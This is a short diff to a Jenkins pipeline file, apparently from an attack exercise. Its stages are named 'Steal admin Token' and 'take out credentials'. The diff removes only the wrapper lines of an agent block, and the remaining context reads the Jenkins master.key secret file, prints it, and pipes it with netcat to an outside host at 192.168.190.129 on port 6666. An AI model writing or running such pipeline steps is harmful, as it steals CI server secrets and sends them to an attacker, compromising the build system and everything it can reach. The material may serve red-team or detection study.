@@ -22,7 +22,6 @@ pipeline {
     } // end stage
 	
 	stage('Steal admin Token') {
-		agent {
 			label 'master' 
 			def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
 			println fileContents
@@ -43,7 +42,6 @@ pipeline {
 			println str
 
 			sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
-		} // end agent
 	}
 	stage('take out credentials') {
 	  //
